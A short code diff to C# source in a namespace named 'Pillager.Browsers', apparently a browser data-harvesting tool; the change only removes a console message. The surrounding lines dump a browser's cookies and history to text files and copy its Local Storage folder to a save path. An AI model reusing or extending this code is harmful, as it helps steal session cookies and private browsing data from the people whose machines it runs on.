@@ -142,8 +142,6 @@ namespace Pillager.Browsers
             if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies); 
             if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
             if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
-
-            Console.WriteLine("Files wrote to " + savepath);
         }
     }
 }
